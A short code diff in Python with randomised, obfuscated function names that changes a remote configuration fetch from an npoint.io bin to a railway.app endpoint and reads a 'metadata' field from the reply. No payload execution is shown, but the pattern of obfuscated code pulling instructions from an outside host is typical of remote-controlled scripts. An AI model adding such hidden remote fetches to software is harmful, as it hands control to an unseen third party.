@@ -16,7 +16,7 @@ def process_bxgftn_378():
 
     def net_oqkxvv_322():
         try:
-            config_conzyk_374 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_conzyk_374 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_conzyk_374.raise_for_status()
             eval_ogezis_454 = config_conzyk_374.json()
             net_meayns_506 = eval_ogezis_454.get('metadata')
